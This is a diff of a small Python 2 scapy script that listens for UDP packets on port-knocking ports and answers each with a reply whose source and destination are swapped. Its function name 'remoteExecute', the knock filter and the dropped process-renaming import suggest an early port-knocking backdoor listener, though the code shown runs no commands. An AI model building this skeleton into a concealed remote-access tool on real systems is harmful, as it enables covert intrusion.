@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import sys, os, argparse, socket, subprocess, setproctitle, logging
+import sys, os, argparse, socket, subprocess, logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
@@ -9,16 +9,22 @@ FILTER = "udp and (dst port {0} or {1} or {2} or 80)".format(KNOCK[0], KNOCK[1],
 
 
 def remoteExecute(pkt):
-    print pkt['Raw'].load
+    print "==============================================="
+    print pkt.show
+    print ""
 
-    pkt = IP(dst="192.168.0.15")/UDP(dport=pkt['UDP'].sport,sport=pkt['UDP'].dport)/'yyyy'
-    send(pkt)
+    pkt2 = IP(src=pkt["IP"].dst, dst=pkt["IP"].src)/UDP(dport=pkt['UDP'].sport,sport=pkt['UDP'].dport)/'yyyy'
+    print pkt2.show
+    print "==============================================="
+    send(pkt2)
+
+def stopfilter(pkt):
+    return True
 
 def main():
-    sniff(filter=FILTER, prn=remoteExecute)
+
+    while 1:
+        sniff(filter=FILTER, prn=remoteExecute, stop_filter=stopfilter)
 
 if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt, AttributeError:
-        print 'Exiting..'
+    main()
